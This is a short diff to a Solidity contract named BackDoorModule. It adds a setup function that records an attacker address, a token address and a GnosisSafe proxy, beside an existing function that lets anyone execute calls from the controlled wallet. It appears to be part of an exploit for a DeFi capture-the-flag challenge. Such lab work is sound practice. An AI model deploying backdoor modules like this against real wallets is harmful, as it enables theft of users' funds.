@@ -26,6 +26,16 @@ contract BackDoorModule is ModuleManager {
         proxy = GnosisSafe(proxy_);
     }
 
+    function setupModule(
+        address attacker,
+        address dvt,
+        address payable proxy_
+    ) external {
+        _attacker = attacker;
+        _dvt = dvt;
+        proxy = GnosisSafe(proxy_);
+    }
+
     // Allows anyone to execute a call from the controlled wallet
     function executeCall(address to, uint256 value, bytes memory data) public {
         // `manager` represents the wallet under control
